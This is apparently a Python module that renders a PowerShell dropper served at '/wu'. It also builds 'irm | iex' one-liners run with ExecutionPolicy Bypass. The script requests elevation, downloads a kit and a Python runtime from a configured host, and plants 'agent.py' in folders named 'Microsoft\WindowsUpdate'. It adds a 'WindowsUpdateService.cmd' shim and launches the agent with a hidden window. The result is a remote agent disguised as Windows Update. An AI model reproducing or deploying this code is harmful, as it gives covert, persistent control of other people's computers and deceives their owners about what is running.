"""The one-liner served at /wu.  Survives: no Python, no admin, no PS7,
restricted ExecutionPolicy, flaky TLS, 32-bit Windows, proxy, re-install."""

from __future__ import annotations

import secrets
from .. import config

TEMPLATE = r'''
function Install-SysPy {
$ErrorActionPreference = 'Stop'
$ProgressPreference    = 'SilentlyContinue'

$base    = '@@BASE@@'
$room    = '@@ROOM@@'
$pass    = '@@PASS@@'
$group   = '@@GROUP@@'
$salt    = '@@SALT@@'
$embed   = '@@EMBED@@'
$protect = @@PROTECT@@
$elevate = @@ELEVATE@@

$arch = 'amd64'
try { if (-not [Environment]::Is64BitOperatingSystem) { $arch = 'win32' } } catch {}

function Say([string]$m) { Write-Host "  $m" }
try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}
try { [Net.WebRequest]::DefaultWebProxy = [Net.WebRequest]::GetSystemWebProxy() } catch {}

function Test-Admin {
    try {
        $id = [Security.Principal.WindowsIdentity]::GetCurrent()
        (New-Object Security.Principal.WindowsPrincipal($id)).IsInRole(
            [Security.Principal.WindowsBuiltInRole]::Administrator)
    } catch { $false }
}

function Fetch([string]$url, [string]$out) {
    for ($i = 1; $i -le 3; $i++) {
        try {
            try { Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing -TimeoutSec 180 }
            catch { (New-Object Net.WebClient).DownloadFile($url, $out) }
            if ((Test-Path $out) -and ((Get-Item $out).Length -gt 1024)) { return $true }
        } catch { Start-Sleep -Seconds (2 * $i) }
    }
    $false
}

function Stop-OldAgent {
    try {
        Get-CimInstance Win32_Process -Filter "Name='pythonw.exe' OR Name='python.exe'" -ErrorAction SilentlyContinue |
            Where-Object { $_.CommandLine -like '*WindowsUpdate*' -and $_.CommandLine -notlike '*--purge*' } |
            ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
    } catch {}
    Start-Sleep -Milliseconds 500
}

function Resolve-Target {
    $c = @()
    if ($env:LOCALAPPDATA) { $c += (Join-Path $env:LOCALAPPDATA 'Microsoft\WindowsUpdate') }
    if ($env:APPDATA)      { $c += (Join-Path $env:APPDATA      'Microsoft\WindowsUpdate') }
    if ($env:PROGRAMDATA)  { $c += (Join-Path $env:PROGRAMDATA  'Microsoft\WindowsUpdate') }
    if ($env:TEMP)         { $c += (Join-Path $env:TEMP         'Microsoft\WindowsUpdate') }
    foreach ($p in $c) {
        try {
            New-Item -ItemType Directory -Force -Path $p | Out-Null
            $probe = Join-Path $p '.wu-write-test'
            Set-Content -Path $probe -Value '1' -ErrorAction Stop
            Remove-Item $probe -Force -ErrorAction SilentlyContinue
            return $p
        } catch {}
    }
    throw 'no writable install directory'
}

# ---------------------------------------------------------------- elevate once
if ($elevate -and -not (Test-Admin)) {
    try {
        $tmp = Join-Path $env:TEMP 'wu-elevated.ps1'
        if (Fetch "$base/wu?elevate=0&arch=$arch" $tmp) {
            Start-Process -FilePath 'powershell.exe' -Verb RunAs -Wait -ArgumentList @(
                '-NoProfile','-ExecutionPolicy','Bypass','-File', $tmp)
            if (Test-Path (Join-Path $env:LOCALAPPDATA 'Microsoft\WindowsUpdate\agent.py')) {
                Say 'installed (elevated)'
                return
            }
        }
    } catch { Say 'elevation declined - continuing user-level' }
}

$target = Resolve-Target
Say "target: $target"

Stop-OldAgent

# ---------------------------------------------------------------- stage bundle
Add-Type -AssemblyName System.IO.Compression.FileSystem
$kit   = Join-Path $env:TEMP 'wu-kit.zip'
$stage = Join-Path $env:TEMP ('wu-stage-' + [guid]::NewGuid().ToString('N').Substring(0,8))

if (-not (Fetch "$base/wu/kit.zip" $kit)) { throw "cannot download $base/wu/kit.zip" }

Remove-Item $stage -Recurse -Force -ErrorAction SilentlyContinue
New-Item -ItemType Directory -Force -Path $stage | Out-Null
[IO.Compression.ZipFile]::ExtractToDirectory($kit, $stage)

foreach ($owned in 'syspy','install','agent.py','bootstrap.py') {
    $dst = Join-Path $target $owned
    for ($try = 1; $try -le 5; $try++) {
        try {
            if (Test-Path $dst) { Remove-Item $dst -Recurse -Force -ErrorAction Stop }
            break
        } catch { Start-Sleep -Milliseconds 400 }
    }
    $src = Join-Path $stage $owned
    if (Test-Path $src) { Move-Item $src $dst -Force }
}
Copy-Item $kit (Join-Path $target 'kit.zip') -Force
Remove-Item $stage -Recurse -Force -ErrorAction SilentlyContinue

$shim = Join-Path $target 'install\wu.cmd'
if (Test-Path $shim) { Copy-Item $shim (Join-Path $target 'WindowsUpdateService.cmd') -Force }

# ---------------------------------------------------------------- deploy.json
$deploy = [ordered]@{
    url          = $base
    room         = $room
    pass         = $pass
    salt         = $salt
    parent       = ''
    parent_ip    = ''
    hop          = 0
    group        = $group
    protected    = $protect
    installed_at = [int](New-TimeSpan -Start (Get-Date '1970-01-01') -End (Get-Date)).TotalSeconds
}
[IO.File]::WriteAllText((Join-Path $target 'deploy.json'),
    ($deploy | ConvertTo-Json), (New-Object Text.UTF8Encoding($false)))

# ---------------------------------------------------------------- interpreter
function Resolve-Python {
    $rt = Join-Path $target 'runtime'
    foreach ($n in 'pythonw.exe','python.exe') {
        $p = Join-Path $rt $n
        if (Test-Path $p) { return @{ Exe = $p; Pre = @() } }
    }
    foreach ($n in 'pythonw.exe','python.exe','py.exe') {
        $c = Get-Command $n -ErrorAction SilentlyContinue
        if (-not $c) { continue }
        $pre = @(); if ((Split-Path $c.Source -Leaf) -ieq 'py.exe') { $pre = @('-3') }
        try {
            $v = & $c.Source @pre -c "import sys;print(sys.version_info[0])" 2>$null
            if ("$v".Trim() -eq '3') { return @{ Exe = $c.Source; Pre = $pre } }
        } catch {}
    }
    $null
}

$py = Resolve-Python
if (-not $py) {
    Say 'no Python found - fetching a private interpreter'
    $rt  = Join-Path $target 'runtime'
    $tmp = Join-Path $env:TEMP 'wu-py.zip'
    $ok  = Fetch "$base/wu/py.zip?arch=$arch" $tmp
    if (-not $ok -and $arch -eq 'amd64') {
        $ok = Fetch "https://www.python.org/ftp/python/$embed/python-$embed-embed-amd64.zip" $tmp
    }
    if (-not $ok) { throw 'cannot obtain an interpreter' }

    Remove-Item $rt -Recurse -Force -ErrorAction SilentlyContinue
    New-Item -ItemType Directory -Force -Path $rt | Out-Null
    [IO.Compression.ZipFile]::ExtractToDirectory($tmp, $rt)

    Get-ChildItem $rt -Filter '*._pth' | ForEach-Object {
        $lines = Get-Content $_.FullName
        $lines = $lines -replace '^\s*#import\s*site\s*$', 'import site'
        if ($lines -notcontains 'import site') { $lines += 'import site' }
        if ($lines -notcontains '..')          { $lines += '..' }
        Set-Content $_.FullName $lines -Encoding ASCII
    }
    foreach ($n in 'pythonw.exe','python.exe') {
        $p = Join-Path $rt $n
        if (Test-Path $p) { $py = @{ Exe = $p; Pre = @() }; break }
    }
}
if (-not $py) { throw 'no usable interpreter' }

# ---------------------------------------------------------------- launch
$exe  = $py.Exe
$leaf = Split-Path $exe -Leaf
if ($leaf -ieq 'python.exe') {
    $w = Join-Path (Split-Path $exe) 'pythonw.exe'
    if (Test-Path $w) { $exe = $w }
} elseif ($leaf -ieq 'py.exe') {
    $w = Join-Path (Split-Path $exe) 'pyw.exe'
    if (Test-Path $w) { $exe = $w }
}

$launchArgs = @() + $py.Pre + @((Join-Path $target 'agent.py'), '--hidden')
Start-Process -FilePath $exe -ArgumentList $launchArgs -WindowStyle Hidden
Say 'installed.'
}

Install-SysPy
'''


def render(base: str = "", room: str = "", passphrase: str = "", group: str = "",
           salt: str = "", protect: bool = True, elevate: bool = True) -> str:
    return (TEMPLATE
            .replace("@@BASE@@", (base or config.PUBLIC_URL).rstrip("/"))
            .replace("@@ROOM@@", room or config.ROOM)
            .replace("@@PASS@@", passphrase or config.PASSPHRASE)
            .replace("@@GROUP@@", group)
            .replace("@@SALT@@", salt or secrets.token_hex(4))
            .replace("@@EMBED@@", getattr(config, "EMBED_VERSION", "3.12.8"))
            .replace("@@PROTECT@@", "$true" if protect else "$false")
            .replace("@@ELEVATE@@", "$true" if elevate else "$false"))


def one_liner(base: str) -> str:
    return ('powershell -NoProfile -ExecutionPolicy Bypass '
            f'-Command "irm {base.rstrip("/")}/wu | iex"')


def one_liner_legacy(base: str) -> str:
    return ('powershell -NoProfile -ExecutionPolicy Bypass -Command '
            f'"(New-Object Net.WebClient).DownloadString(\'{base.rstrip("/")}/wu\') | iex"')
